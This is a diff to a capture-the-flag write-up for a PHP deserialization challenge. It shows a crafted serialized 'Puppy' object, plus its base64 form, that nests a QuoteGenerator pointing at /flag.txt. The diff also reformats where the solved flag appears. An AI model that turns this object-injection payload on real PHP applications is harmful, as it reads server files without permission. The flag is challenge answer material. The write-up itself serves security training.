@@ -29,8 +29,10 @@ This object is then declared, serialized and then the base64 representation is e
 The code is then compiled using a PHP compiler/interpreter, and the output is submitted in the website. 
 The flag is printed on the image.
 
-flag{what_a_nice_puppy_you_got!You_can_bring_him_home_now}
-
+### Object
 ```
 O:5:"Puppy":4:{s:8:"eyeColor";a:3:{i:0;i:28;i:1;i:160;i:2;i:131;}s:7:"eyeSize";i:57;s:10:"background";a:3:{i:0;i:235;i:1;i:89;i:2;i:233;}s:5:"quote";O:14:"QuoteGenerator":1:{s:9:"quoteFile";s:9:"/flag.txt";}}Tzo1OiJQdXBweSI6NDp7czo4OiJleWVDb2xvciI7YTozOntpOjA7aToyODtpOjE7aToxNjA7aToyO2k6MTMxO31zOjc6ImV5ZVNpemUiO2k6NTc7czoxMDoiYmFja2dyb3VuZCI7YTozOntpOjA7aToyMzU7aToxO2k6ODk7aToyO2k6MjMzO31zOjU6InF1b3RlIjtPOjE0OiJRdW90ZUdlbmVyYXRvciI6MTp7czo5OiJxdW90ZUZpbGUiO3M6OToiL2ZsYWcudHh0Ijt9fQ==
 ```
+
+### Flag
+flag{what_a_nice_puppy_you_got!You_can_bring_him_home_now}
